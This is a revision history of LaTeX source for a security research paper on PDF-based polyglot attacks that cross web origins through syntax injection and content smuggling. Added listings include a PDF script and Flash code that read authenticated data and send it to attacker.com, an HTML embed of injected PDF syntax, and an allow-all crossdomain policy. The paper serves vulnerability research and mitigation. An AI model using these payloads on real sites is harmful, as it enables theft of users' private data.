-malicious attacker-supplied format. 
-%
-
-%As an example the
-%same-origin policy allows a \emph{script} tag in one document to include JavaScript of
-%another origin and execute it in the origin of the document. If an attacker is
-%able to inject an HTML document with JavaScript syntax in such a way that it
-%became valid JavaScript, the attacker can include the document across origins
-%via a \emph{script} tag and extract its content, thereby circumventing the same-origin
-%policy.
-
-%The document in Listing \ref{lst:html-js}, is both
-%malformed but valid HTML and valid JavaScript in browsers that support
-%EcmaScript for XML (E4X). \todo{ref} The
-%document can be included as a script in another document and the secret can be
-%extracted from variable x. 
-%This implies that if an attacker is able to inject
-%HTML syntax into a document, closing all previously open tags and
-%opening all subsequently closed tags,
-%then information can be extracted across origins.
-%The injected syntax in the listing is illustrated by highlighting.
-
-%This attack has been suggested as a potential way to bypass Content Security
-%Policy~\cite{Heyes:CSP}. As E4X is only supported in the SpiderMonkey JavaScript
-%engine, used in Firefox, this limits the exploitability of this example. However,
-%this is an unlikely scenario to use JavaScript as the injected format
-%because HTML characters are typically escaped by content
-%filters.
-
-Previous work documents instances of polyglot attacks based on syntax injection.
-Huang et al.~\cite{Huang+:CCS10} describe a cross-origin \emph{cascading style-sheet} (CSS) attack. This 
-attack injects fragments of CSS syntax in a HTML 
-document, thereby making it a HTML/CSS polyglot. The error-tolerant parsing of 
-style sheets allow the polyglot to parsed as valid CSS. The capabilities of CSS 
-provide trivial cross-origin leakage. The paper proposes a defense technique which has been
-adopted by all major browsers, which implies that the attacks outlined in their paper are now ineffective.
-Instead,
-Section
-\ref{sec:vuln} will show practical attacks based on other formats.
-
-%\definecolor{lightgray}{gray}{.8}
-%\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot, escapechar=*]
-%<html><body>
-%Hello *\colorbox{lightgray}{$<$/body$><$/html$>$;x=$<$html$><$body$>$}*!
-%Your secret is 'safe with me'.
-%</body></html>
-%\end{lstlisting}
-
-\paragraph{Content smuggling}
-The vulnerable target of a polyglot attack based on content smuggling lets 
-users to submit files to the service which are then served under the origin of 
-the service. Examples of such services are file sharing services, image databases, 
-social networks or job broker services. Such a service 
-accepts a limited set of file-types, and the files are verified to
-be of one of these types, e.g. an image, before being served to the end
-user. By submitting a polyglot to such a service, an attacker can trick the
-service into serving malicious content under the origin of the service. The
-service will verify the file, assuming that it is of the benign format, but once
-the content is served an attacker can coerce the content to be interpreted as
-the malicious format.
-
-The GIFAR attack is a polyglot attack based on content smuggling. In this attack 
-a benign GIF-image and a malicious JAR-file is combined to create a GIF/JAR 
-polyglot. By submitting the combined GIFAR to a service, the attacker can 
-execute a Java applet under the origin of the targeted service. The Java runtime 
-has been updated to prevent this kind of abuse.
-Instead,
-Section
-\ref{sec:vuln} will show practical attacks based on other formats.
-
-\subsection{Exploiting the infiltrated origin}
+\subsection{Payloads}
 
@@
 If the format also has the capability of communicating with the attacker, then 
-the attacker can sensitive user information and leak it across origins. If the 
+the attacker can extract sensitive user information and leak it across origins. If the 
 format is not restricted by the SOP, it can communicate directly with the 
@@
 suitable for making polyglots. One such design choice is the error tolerant 
-parser. This is in part motivated it being a container format, of which the 
+parser. This is in part motivated by PDF being a container format, of which the 
 implication is that a PDF file can, by design, contain foreign syntax that 
@@
 that the browser rely on the plug-in to handle the situation when the MIME-type 
-supplied by the server is in appropriate for the plug-in.
+supplied by the server is inappropriate for the plug-in.
 In the case of the Adobe Reader plug-in, it disregards the MIME-type
@@
 injecting an end comment token, certain filters remove any occurrences of "-->", 
-but leave the of the input untouched. HTML comments are meaningless to PDF, 
+but leave the rest of the input untouched. HTML comments are meaningless to PDF, 
 and the result is a valid HTML/PDF polyglot.
@@
 line feed characters. In the spirit of making minimal changes to the input, 
-certain websites only these characters. This is sufficient to prevent cross-site 
+certain websites only escape these characters. This is sufficient to prevent cross-site 
 scripting attacks, but fail to protect against PDF-based polyglot attacks.
@@
 about any other format. This provides ample opportunity to create malicious 
-polyglots where PDF is either the benign or the malicious format.
+polyglots where PDF is either the benign or the malicious format. Consequently, 
+this significantly expands the attack surface, making it important to take 
+measures to protect against these attacks.
 
@@
 
-To better understand the how this problem presents itself, a comparison of browser and reader instances 
+To better understand how this problem presents itself, a comparison of browser and reader instances 
 is presented. We compare all major browsers and two of the most common readers.
@@
 
-Section~\ref{sec:vuln} focus on the Adobe PDF Reader as the attack surface, 
+Section~\ref{sec:vuln} focuses on the Adobe PDF Reader as the attack surface, 
 due to its standing as the most commonly used reader. To give a comparison, the 
@@
 Google moved away from sanitizing content, as it was found to be insufficient in 
-many cases.
-
-Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
-untrusted user files that their various services provide for their customers.
+many cases. These best-practices successfully prevents content-smuggling 
+attacks in all aspects, as the infiltrated origin is separate from the origin 
+containing sensitive data.
+
+%Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
+%untrusted user files that their various services provide for their customers.
 

### 2013-02-18 main.tex
AFK sleeping

@@
 security issues. 
+%
 
@@
 
-Two attacker-centric components require special attention, the infiltration of 
-an origin and the exploitation of an infiltrated origin.
+While these articles document known instances of polyglot attacks, the attack 
+method has up until now never been generalized. 
+\todo{Is this a good place? is it a good way to say it?}
+%
+Two attacker-centric components require special attention; the infiltration of 
+an origin, i.e. the attack vector, and the exploitation of an infiltrated origin, i.e. the payload.
 %In this situation, the same-origin policy is intended to prevent cross-origin 
@@
 
-In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more than one way.
-This paper identifies two vectors for infiltrating an origin, via syntax 
-injection, or content smuggling.
+%In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more %than one way.
+This paper identifies two vectors for infiltrating an origin, either via syntax 
+injection, or content smuggling. In the case of syntax injection, existing content is manipulated
+to become a polyglot, whereas with content smuggling, a polyglot is used to evade 
+content filters.
 
 \subsubsection{Syntax injection}
-
-In a cross-site scripting attack, an HTML document is composed from input 
-containing fragments of HTML syntax, causing the execution of attacker supplied 
+\label{sec:injection}
+In a cross-site scripting attack user input is used to compose an HTML document. 
+Fragments of HTML-syntax in the input alters the semantic of the document to 
+execute attacker supplied 
 script code. Similarly, in a syntax injection attack the vulnerable target will 
 compose content from attacker controlled input containing syntax of a foreign 
-format, thereby creating a polyglot. 
-%
-The target is assumed to employ server-side cross-site scripting sanitization. Hence, for the attack to be successful, the input must 
+format, thereby creating a polyglot. The polyglot is benign when viewed as the 
+original format, but malicious when viewed as the injected format. While the 
+targeted service serves the content as its original format, it is in the hands 
+of the attacker to decide how it is interpreted.
+%
+The targeted service is assumed to employ server-side cross-site scripting 
+sanitization. Hence, for the attack to be successful, the input must 
 bypass this sanitization. The sanitization filter will remove or encode 
-problematic characters, based on the context of the web application. In a polyglot attack
-the injected format would pose as a new context, unknown to the filter. Chances are that the 
+problematic characters related to HTML-syntax, based on the context of the web application. In a polyglot attack
+the injected format will pose as a new context, unknown to the filter. Chances are that the 
 key elements of the injected format will pass the filter unaltered.
-The polyglot content can
-be interpreted as either the benign original format or the
-malicious attacker-supplied format. 
+
+%The polyglot content can
+%be interpreted as either the benign original format or the
+%malicious attacker-supplied format. 
 %
@@
 
-\begin{figure}[h!]
-  \center
-  \includegraphics[width=0.49\textwidth]{injection-scenario.png}
-  \caption{Overview of the syntax injection scenario}
-  \label{fig:scenario}
-\end{figure}
-
-Previous work documents instances of polyglot attacks based on syntax injection.
+Previous work documents an instance of a polyglot attack based on syntax injection, though not phrased in those terms.
 Huang et al.~\cite{Huang+:CCS10} describe a cross-origin \emph{cascading style-sheet} (CSS) attack. This 
@@
 
+\paragraph{Scenario}
+The scenario, illustrated in Figure~\ref{fig:injection-scenario}, describe how 
+the attack proceed, from the infiltration of the origin, to the compromise of the victim.
+The victim in this scenario is an authenticated user of the targeted website, \emph{vulnerable.com}. 
+The \emph{vulnerable.com} site serves the polyglot content as the benign content type, harmless to the victim. 
+At a certain point, while still authenticated to \emph{vulnerable.com}, 
+the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com} (1).
+The \emph{attacker.com} site serves a page that embeds the content from \emph{vulnerable.com} (2). 
+The attacker supplies polyglot syntax in the input to the vulnerable 
+service, e.g. in the parameters of the request for the embedded content (3).
+The \emph{vulnerable.com} service responds with content of the benign content type (4), but
+the way it is embedded in the attackers page coerces the browser to interpret it as the malicious content type.
+The malicious payload is executed in the origin of \emph{vulnerable.com} and can 
+hence leverage the credentials of the victim to further exploit the vulnerability.
+
+\begin{figure}[t]
+  \center
+  \includegraphics[width=0.49\textwidth]{injection-scenario.png}
+  \caption{Overview of the syntax injection scenario}
+  \label{fig:injection-scenario}
+\end{figure}
+
 %\definecolor{lightgray}{gray}{.8}
@@
 \subsubsection{Content smuggling}
-The vulnerable target of a polyglot attack, based on content smuggling, lets 
-users to submit files to the service which are subsequently served under the origin of 
-the service. Examples of such services are file sharing services, image databases, 
-social networks or job broker services. Such a service 
-accepts a limited set of file-types, and the files are verified to
-be of one of these types, e.g. an image, before being served to the end
-user. By submitting a polyglot to such a service, an attacker can trick the
-service into serving malicious content under the origin of the service. The
-service will verify the file, assuming that it is of the benign format, but once
-the content is served an attacker can coerce the content to be interpreted as
-the malicious format.
+\label{sec:smuggling}
+The vulnerable target of a content smuggling attack, lets 
+users submit files to the service which are subsequently served under the origin of 
+the service. Examples of such potentially vulnerable services are file sharing services, image databases, 
+social networks, conference management systems or job broker services. Such a service 
+accepts a limited set of file-formats, and the files are run through a filter to verify that they 
+belong to this set, e.g. images, before being served to the end
+user. The
+service will verify the file under the assumption that it conforms strictly to one format. 
+By submitting a polyglot to such a service, an attacker can evade the filter as the polyglot does conform to the benign format.
+Since the attacker can coerce the content to be interpreted as the malicious format, the
+service is tricked into serving malicious content.
+
+%a polyglot assuming that it is of the benign format, but once
+%the content is served an attacker can coerce the content to be interpreted as
+%the malicious format.
 
@@
 \paragraph{Scenario}
-
-The scenario, illustrated in Figure~\ref{fig:scenario}, describe how the attack proceed, from the infiltration of the origin, to the compromise of the victim.
+The content smuggling scenario proceeds as illustrated in Figure~\ref{fig:smuggling-scenario}.
 The victim in this scenario is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
@@
 To give more context to the scenario, \emph{vulnerable.com} can be a cloud storage service. 
-The attacker infiltrates the target by uploading a polyglot to the service and embed it 
+The attacker infiltrates the target by uploading a polyglot to the service and embedding it 
 on \emph{attacker.com}. While authenticated to \emph{vulnerable.com}, the unsuspecting victim visits \emph{attacker.com}, the embedded 
@@
 
-\begin{figure}[h!]
+\begin{figure}[t]
   \center
@@
   \caption{Overview of the content smuggling scenario}
-  \label{fig:scenario}
+  \label{fig:smuggling-scenario}
 \end{figure}
@@
 certain event occur, such as a file is opened or a page is displayed, and the action 
-dictionary specify how it should be handled. Actions can be used to, among other 
+dictionary specify how it is handled. Actions can be used to, among other 
 things, go to a specific page, play a sound, execute JavaScript or launch a command.
@@
 \paragraph{Stream objects}
-A stream is an unlimited sequence of bytes. A stream object consists of a 
+A stream is an unlimited sequence of bytes. A stream object shall always be indirect and consists of a 
 dictionary, describing the stream, and the associated stream delimited by the 
-"stream" and "endstream" keywords. PDF supports encoding of streams, in which
+"stream" and "endstream" keywords. 
+%
+According to the specification, the stream dictionary shall contain a \emph{Length} 
+name to specify the length of the stream. In practice this can be omitted as 
+long as the delimiting keywords are in place.
+%
+PDF supports encoding of streams, in which
 case the dictionary describe which filters are required to decode the stream.
@@
 section and an end-of-file marker. The trailer dictionary is introduced by the 
-"trailer" keyword. It contains among other things a reference to the root of the 
+"trailer" keyword. 
+%
+\emph{Root} is in practice the only mandatory name in the trailer dictionary, referencing the root of the 
+%
 document structure. The "startxref" keyword is followed by the number of bytes from 
@@
 \subsection{PDF-based polyglots}
+\label{sec:pdf-based-polyglots}
 Several design choices in the PDF specification make the format particularly 
 suitable for making polyglots. One such design choice is the error tolerant 
-parser. This is in part motivated by PDF being a container format, of which the 
-implication is that a PDF file can, by design, contain foreign syntax that 
+parser. This is in part motivated by PDF being a container format, 
+%of which the 
+another design choice which implies
+%implication is 
+that a PDF file can, by design, contain foreign syntax that 
 could interfere with the syntax of the file. Another motivation is that PDF 
@@
 
+\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
+%PDF-
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
+
 % - Execute JavaScript
@@
 many capabilities. Some examples include executing JavaScript, launching commands, 
-and issuing HTTP requests. Adobe Reader even includes a flash 
-player to play embedded flash files on systems that do
-not have a player installed. %Considering that it might be a conscious decision
+and issuing HTTP requests. The HTTP requests are restricted to the origin of the 
+PDF file, and will include any cookies associated with that origin. 
+Adobe Reader also includes a flash 
+runtime to play embedded flash files on systems that do
+not have the Flash runtime installed. %Considering that it might be a conscious decision
 %of the user to refuse a flash player,
@@
 that the plug-in is selected based 
-on the MIME-type, either supplied by the server or in the type attribute, and 
+on the MIME-type, either supplied by the server or in the type attribute
+%
+with preference for the later.
+%
+Also recall
 that the browser rely on the plug-in to handle the situation when the MIME-type 
-supplied by the server is inappropriate for the plug-in.
+supplied by the server is inconsistent with the MIME-type of the plug-in.
 In the case of the Adobe Reader plug-in, it disregards the MIME-type
 supplied by the server and will attempt to interpret any content as PDF. 
-
-\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
-%PDF-
-trailer<</Root<</Pages<<>>>>>>
+Listing~\ref{lst:embed-pdf} shows how 
+arbitrary content can be rendered as PDF format.
+
+\begin{lstlisting}[label=lst:embed-pdf, caption=HTML for embedding PDF content]
+<embed type="application/pdf" 
+src="vulnerable.com/content?input=%PDF...">
 \end{lstlisting}
@@
 
-Based on the PDF samples in Listings~\ref{lst:minimal-pdf}, we can derive 
+As the scenario details in Section~\ref{sec:injection}, the attacker in a syntax 
+injection attack manipulates a vulnerable service to include PDF syntax in existing content, e.g. HTML-documents.
+The PDF syntax is typically injected through user input used by the vulnerable service in the composition of documents.
+%
+An example of a suitable fragment to inject is shown in Listing~\ref{lst:xml-pdf}.
+%
+The content is subsequently 
+embedded in the attackers page as PDF, as exemplified in Listing~\ref{lst:embed-pdf}.
+As mentioned in Section~\ref{sec:pdf-based-polyglots}, the embedded PDF can issue 
+requests to the origin it came from, carrying the cookies associated with that origin.
+These requests allow for the extraction of sensitive user data that can either be communicated back to the attacker, or be leveraged in further attacks.
+
+Thus far, exploitation of vulnerable services have been discussed, excluding the specific 
+conditions under which a service is vulnerable. In order to exploit the 
+vulnerability, the injected syntax must pass through any existing filters 
+unchanged or at least with its semantics preserved. If user input in an 
+HTML-document is not sanitized, any syntax would be unchanged and 
+the service is vulnerable to less sophisticated attacks, e.g. cross-site scripting, 
+therefore sanitized user input is of greater concern.
+%
+Based on the PDF samples in Listings~\ref{lst:minimal-pdf} and~\ref{lst:xml-pdf}, we can derive 
 the set of tokens required to build a PDF. Assuming that alpha-numeric characters 
@@
 \subsection{Content smuggling}
-
+\todo{Deal with this section, extend and polish}
 Due to the nature of the PDF, it can without much effort be combined with just 
@@
 \paragraph{PDF as the benign format}
+\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
 Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
@@
 \subsection{PDF communication methods}
-
-The embedded document will retain the origin from which it was served. All 
-request issued from the document will include any cookies available in the 
-browser for the target domain.
-When embedded in a web page, many of the PDF communication methods utilize
-the underlying browser to make requests by navigating the browser to the target 
-URL. This will unload the current page in which the document is embedded. Arbitrary page 
-navigation is allowed with respect to SOP, since the response is not visible 
-to the document. Such methods can be used in CSRF attacks, but would 
-defeat the purpose of requesting information as the document cannot process the 
-response.
+%\todo{rewrite section, focus on embedded flash, xxe and code samples}
+%
+In order to extract information and leak across origins, a communication channel
+is required. PDF documents provide multiple ways of generating HTTP requests. 
+Many of these are cross-origin, but, out of security concerns, only one-way in the sense that 
+the PDF document will never see the result. Therefore, the focus is directed towards 
+two methods that allow bidirectional communication. Since the document will retain the 
+origin from which it was served, all 
+requests issued from the document will include any cookies associated with the target origin.
+
+%When embedded in a web page, many of the PDF communication methods utilize
+%the underlying browser to make requests by navigating the browser to the target 
+%URL. This will unload the current page in which the document is embedded. Arbitrary page 
+%navigation is allowed with respect to SOP, since the response is not visible 
+%to the document. Such methods can be used in CSRF attacks, but would 
+%defeat the purpose of requesting information as the document cannot process the 
+%response.
 
 % Cross-origin leaks
-To leak information across origins, a communication channel is 
-required between the attacker and the target. PDF provides the necessary means 
-to mediate this information leakage. The flow of information can be divided into 
-two steps, extracting information from the target and delivering it to the attacker.
-Each requiring its own communication methods.
-
-\subsubsection{The target}
-There are two methods for a PDF file to communicate with the server it originates from, 
-both allowing it to read the response: from JavaScript using XML external entities 
-and from an embedded flash file.
-
-\paragraph{XML}
-The PDF JavaScript API includes a method to parse an XML document, called 
-XMLData.parse. The XML document being processed may rely on external entities, 
-which the XML parser will request and include in the document. The request is 
-bound to the origin of the document. As the response 
+%To leak information across origins, a communication channel is 
+%required between the attacker and the target. PDF provides the necessary means 
+%to mediate this information leakage. The flow of information can be divided into 
+%two steps, extracting information from the target and delivering it to the attacker.
+%Each requiring its own communication methods.
+
+%\subsubsection{The target}
+%There are two methods for a PDF file to communicate with the server it originates from, 
+%both allowing it to read the response: from JavaScript using XML external entities 
+%and from an embedded flash file.
+
+\paragraph{XML External Entities}
+The PDF JavaScript API includes a method to parse XML documents, called 
+XMLData.parse. The XML document being processed may in turn rely on external entities, 
+required for the parsing of the document, which the XML parser will request. The request is 
+bound to the origin of the document, and the response is included in the XML document. 
+The source code of the XML document reflects this response and can be retrieved at a later point. This 
+results in a bidirectional communication channel.
+%
+As the response 
 is included in the XML, the result has to be well-formed XML. This puts a 
@@
 that HTML pages are rarely well-formed this method may be too restricted in practice.
-Listing~\ref{lst:xml-pdf} contains an example that uses XML external entities.
-
-\paragraph{Embedded Flash}
-The embedded flash file inherits the origin of the document, thus it can 
-request and read any document from the originating server. Unlike the XML
-method, there is no restrictions on what content can be requested.
+
+Listing~\ref{lst:xml-pdf} contains an example PDF document that uses XML external 
+entities. Note that the one-way method \emph{getURL} is used to communicate the 
+information back to the attacker. Given the compact size of the example, it is useful for the syntax 
+injection scenario in Section~\ref{sec:injection}, which require injection of 
+small syntax fragments.
 
@@
 var doc = XMLData.parse(xml);
-app.alert(doc.saveXML())
+getURL('attacker.com/?'+doc.saveXML())
 endstream
@@
 
-\subsubsection{The attacker}
-There are a number of ways to communicate with the attacker, either directly 
-via the embedding page or through the attackers server. As mentioned previously, 
-many methods trigger page navigation in the browser. This will result in a 
-noticeable change in the victims browser. While it fulfills the purpose of 
-leaking information, an attacker can use more covert methods of communication
-to refrain from alerting the victim.
-
-\paragraph{Fragment identifier}
-The methods that navigate the browser can still be used for a somewhat covert 
-communication with the attacker. Navigating to the same page with a different 
-fragment identifier will not reload the page. Embedding the information in the fragment 
-identifier of the URL of the embedding website, creates a one-way communication 
-channel from the document to the page. Since the fragment identifier is visible 
-in the address field of the browser, an alert user would notice it changing.
-
-\paragraph{PostMessage}
-The PDF plugin includes an API for communicating directly with the page in 
-which it is embedded. The document can send messages to the page using 
-the hostContainer.postMessage method. The page registers a handler to receive 
-the event and is also able to post messages back to the document.
-This two way communication is not visible to the victim.
-
 \paragraph{Embedded Flash}
-Cross-origin communication in Flash is restricted by the same-origin policy,
-but also support cross-origin communication via  
-CORS. Using CORS, a web server can relax SOP to allow access to specified content.
-As mentioned, the embedded Flash file inherits the origin of the document.
-However, this is not a restriction, since an attacker can set a cross-origin policy 
-that allow the request. This allows for a two way communication that is not 
-visible to the victim.
+By embedding a Flash file in the PDF document the capabilities of the format can be 
+extended even further. The Flash runtime supports bidirectional communication in 
+accordance with SOP.
+%
+The embedded Flash inherits the origin of the PDF document, thus it can 
+request and read any document from the originating server. Unlike the XML
+method, there are no restrictions on what content can be requested, thus making 
+it the most versatile of the available communication methods. The only drawback 
+using this approach is the significant increase in terms of file size. Even the compact 
+flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
+This suggests that this method might be better suited for the content smuggling 
+scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
+
+\begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
+package {
+  import flash.net.*;
+  import flash.display.Sprite;
+  public class Secret extends Sprite {
+    var u:String;
+    var r:URLRequest;
+    var l:URLLoader;
+    public function Secret() {
+      u = 'vulnerable.com/secret';
+      r = new URLRequest(u);
+      l = new URLLoader(r);
+
+      l.addEventListener('complete', 
+        function():void {
+          u = 'attacker.com/?' + r.data;
+          r = new URLRequest(u);
+          l = new URLLoader(r);
+        });
+    }
+  }
+}
+\end{lstlisting}
+
+Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
+ Flash also supports cross-origin communication via  
+cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
+%As mentioned, the embedded Flash file inherits the origin of the document.
+An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain} 
+that open up for two way communication.
+
+\begin{lstlisting}[label=lst:crossdomain, caption=Allow-all crossdomain.xml]
+<?xml version="1.0"?>
+<cross-domain-policy>
+  <allow-access-from domain="*" />
+</cross-domain-policy>
+\end{lstlisting}
+
+%\subsubsection{The attacker}
+%There are a number of ways to communicate with the attacker, either directly 
+%via the embedding page or through the attackers server. As mentioned previously, 
+%many methods trigger page navigation in the browser. This will result in a 
+%noticeable change in the victims browser. While it fulfills the purpose of 
+%leaking information, an attacker can use more covert methods of communication
+%to refrain from alerting the victim.
+
+%\paragraph{Fragment identifier}
+%The methods that navigate the browser can still be used for a somewhat covert 
+%communication with the attacker. Navigating to the same page with a different 
+%fragment identifier will not reload the page. Embedding the information in the fragment 
+%identifier of the URL of the embedding website, creates a one-way communication 
+%channel from the document to the page. Since the fragment identifier is visible 
+%in the address field of the browser, an alert user would notice it changing.
+
+%\paragraph{PostMessage}
+%The PDF plugin includes an API for communicating directly with the page in 
+%which it is embedded. The document can send messages to the page using 
+%the hostContainer.postMessage method. The page registers a handler to receive 
+%the event and is also able to post messages back to the document.
+%This two way communication is not visible to the victim.
+
+%\paragraph{Embedded Flash}
 
@@
 
-\paragraph{Safari and Opera}
-The browsers, Safari and Opera, are both susceptible to the attacks outlined as 
+\paragraph{Firefox, Safari and Opera}
+The browsers, Firefox, Safari and Opera, are all susceptible to the attacks outlined as 
 per Section~\ref{sec:vuln}, without any restrictions or modifications.
-
-\paragraph{Firefox}
-The Mozilla Firefox browser is susceptible to the attacks, with the restriction 
-that the PostMessage API is unavailable. This merely prevents one channel of 
-communication with the attacker, and does not reduce the threat.
 
@@
 
+\todo{What about serving as attachment, so that it is not viewed within the browser? How does it work with embedded content?}
+\todo{Problem of transferring credentials between domains for services where the content requires authentication}
+
 %Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
@@
 of the PDF format. In addition, it highlights that PDF interpreters
-often disregard the specification demands. This particularly
+often disregard the specification demands. This is particularly
 relevant as it allows crossbreeding PDF with such

### 2013-02-18 main.tex
new format

@@
-\documentclass{acm_proc_article-sp}
+%\documentclass{acm_proc_article-sp}
 %\documentclass[10pt, conference, compsocconf]{IEEEtran}
 
-% From ASIACCS'13 CFP
-% Submissions must be written in English, and must be at most 10 pages
-% excluding the bibliography and well-marked appendices, and at most
-% 12 pages overall.
+\documentclass[letterpaper,twocolumn,10pt]{article}
+\usepackage{usenix,epsfig,endnotes}
+
+%don't want date printed
+\date{}
+
+%make title bold and 14 pt font (Latex default is non-bold, 16 pt)
+\title{\Large \bf Polyglots : Crossing Origins by Crossing Formats}
 
@@
 \newcommand{\todo}[1]{\colorbox{red}{\textcolor{white}{\sffamily\bfseries\scriptsize TODO}} \textcolor{red}{#1} \textcolor{red}{$\blacktriangleleft$}}
-
-\title{Crossing Origins by Crossing Formats}
 
@@
 web page to extract information from the existing web page.
-%
-The paper is the first to perform a systematic study of polyglot
+
+\paragraph{Generalizing polyglots} 
+The paper is the first to perform a generalization and systematic study of polyglot
 attacks.
+We identify the necessary ingredients for polyglot attacks.
 We characterize of what constitutes a dangerous format in the web setting and
@@
 demonstrate that polyglot-based attacks on the web open up for insecure
-communication across Internet origins. We perform a systematic study of
+communication across Internet origins.
+
+\paragraph{PDF polyglots} 
+Having identified PDF as a particularly dangerous format, we perform
+a novel in-depth study of
 PDF-based injection and content smuggling attacks. 
+Our findings expose new attack vectors, which we demonstrate both
+conceptually and by a proof-of-concept web pages.
 
@@
 
-\paragraph{Contributions} The paper makes the following contributions:
-\begin{itemize}
-\vspace*{-.6cm}
-\item Identification of polyglot attacks, a new breed of attacks for
-  crossing origins by crossing formats;
-\vspace*{-.2cm}
-\item Characterization of the necessary ingredients for polyglot attacks
-\vspace*{-.2cm}
-\item Highlighting the PDF format as a particularly exposed format for
-  polyglot attacks;
-\vspace*{-.2cm}
-\item Novel confidentiality and integrity attack vectors, based on syntax 
-  injection and content smuggling;
-\vspace*{-.2cm}
-\item Evaluation of the current filtering mechanisms, browsers, and PDF
-  filters for vulnerabilities; and
-\vspace*{-.2cm}
-\item Mitigation for the server, client, and PDF readers.
-\end{itemize}
+%%% removed it - it repets what we already say above
+% \paragraph{Contributions} The paper makes the following contributions:
+% \begin{itemize}
+% \vspace*{-.6cm}
+% \item Identification of polyglot attacks, a new breed of attacks for
+%   crossing origins by crossing formats;
+% \vspace*{-.2cm}
+% \item Characterization of the necessary ingredients for polyglot attacks
+% \vspace*{-.2cm}
+% \item Highlighting the PDF format as a particularly exposed format for
+%   polyglot attacks;
+% \vspace*{-.2cm}
+% \item Novel confidentiality and integrity attack vectors, based on syntax 
+%   injection and content smuggling;
+% \vspace*{-.2cm}
+% \item Evaluation of the current filtering mechanisms, browsers, and PDF
+%   filters for vulnerabilities; and
+% \vspace*{-.2cm}
+% \item Mitigation for the server, client, and PDF readers.
+% \end{itemize}
 
@@
 While these articles document known instances of polyglot attacks, the attack 
-method has up until now never been generalized. 
-\todo{Is this a good place? is it a good way to say it?}
+method has not been generalized until this paper.
 %

### 2013-02-20 main.tex
Updates in Evaluation and Mitigation

--- 2013-02-18 main.tex
@@
 \subsection{Syntax injection}
-
+\label{sec:pdf-injection}
 As the scenario details in Section~\ref{sec:injection}, the attacker in a syntax 
@@
 \subsubsection{Readers}
-
+\label{sec:readers}
 Section~\ref{sec:vuln} focuses on the Adobe PDF Reader as the attack surface, 
@@
 The study shows that all major browsers are susceptible to the attacks outlined 
-in Section~\ref{sec:vuln}, with some minor differences.
+in Section~\ref{sec:vuln}, with some minor differences detailed below and summarized in Table~\ref{tab:comparison}.
 
@@
 handled by the built-in reader. The built-in reader will then prompt the user 
-to open the document in Adobe Reader. As previously noted, the built-in reader 
+to open the document in Adobe Reader. As previously noted in Section~\ref{sec:readers}, the built-in reader 
 is not vulnerable to attacks. Hence, Chrome is only susceptible when the Adobe 
@@
 
+\begin{table}[h!]
+\begin{tabular}{l||c|c|c}
+& object & embed & Adobe is default \\ \hline
+Firefox & X & X & X \\ \hline
+Chrome & X & X & --- \\ \hline
+Safari & X & X & X \\ \hline
+Opera & X & X & X \\ \hline
+Internet Explorer & --- & X & X %\\ \hline
+\end{tabular}
+\caption{Comparison of browsers}
+\label{tab:comparison}
+\end{table}
 %\subsection{Bypassing content filters}
@@
 potential targets generally require authentication before submitting content.
-
-The study is based on supplying the websites with small benign samples 
-of PDF syntax, containing keywords and tokens, and examining the responses 
-for said tokens. The conclusion is 
+We refrain from mentioning names of individual websites to prevent exploitation 
+before the issues have been properly dealt with. Neither do we want to disclose 
+these websites as particularly vulnerable.
+
+The study is based on supplying the websites with the benign minimal PDF in 
+Listing~\ref{lst:minimal-pdf}, and examining the corresponding responses to this input.
+The sample contains the essential keywords and tokens required to perform a syntax 
+injection based polyglot attack. If these tokens pass through unaltered, the website is 
+considered vulnerable. Only public accessible input parameters, those that do not require authentication, 
+were tested, which suggests that more websites are likely vulnerable in input that do
+requires authentication.
+
+The conclusion is 
 that nine websites out of the hundred apply insufficient content filtering with 
-respect to the PDF format, which have the potential of compromising the 
-confidentiality and integrity of the website's users.
+respect to the PDF format. Out of the nine found to be vulnerable;three were susceptible to traditional 
+XSS and thereby also to PDF polyglot attacks, two were susceptible only to PDF based polyglot attacks, and four applied 
+insufficient content filtering, but the input was reflected in a way that prevented exploitation.
+%
+%, which have the potential of compromising the 
+%confidentiality and integrity of the website's users.
 %
@@
 \label{sec:mit}
-This section will describe our recommendations for mitigation in each of the
-affected components.
+This section gives advice on various mitigation approaches available for each of the
+affected components, from server to client.
 
@@
 
-To prevent PDF syntax injection attack, the task is simpler. As mentioned in 
-Section~\ref{sec:vuln}, there is a limited set of characters that are essential 
+To prevent PDF-based syntax injection attack, the task is simpler. The token-set identified in 
+Section~\ref{sec:pdf-injection}, are essential 
 to create valid PDF syntax, namely \emph{'$<$', '$>$', and '/'}. Filtering 

### 2013-02-21 main.tex
Major updates of mitigtion and some in Vulnerabilities and attacks

@@
 
-Other potential targets for this scenario are job broker services and conference 
-submission systems, which by design allow submission of PDFs to be viewed by
-users.
+%Other potential targets for this scenario are job broker services and conference 
+%management systems, which by design allow submission of PDFs to be viewed by
+%users.
 
@@
 \subsection{Payloads}
-
+\label{sec:payloads}
 The consequences of exploiting an infiltrated origin depend on the capabilities 
@@
 
-\paragraph{Cross-origin leakage}
+\paragraph{Cross-origin information leakage}
 
@@
 <embed type="application/pdf" 
-src="vulnerable.com/content?input=%PDF...">
+src="vulnerable.com/?input=%PDF...">
 \end{lstlisting}
@@
 requests to the origin it came from, carrying the cookies associated with that origin.
-These requests allow for the extraction of sensitive user data that can either be communicated back to the attacker, or be leveraged in further attacks.
+These requests allow for the extraction of sensitive user data that can either be 
+communicated back to the attacker, or be leveraged in further attacks.
 
@@
 \subsection{Content smuggling}
-\todo{Deal with this section, extend and polish}
+
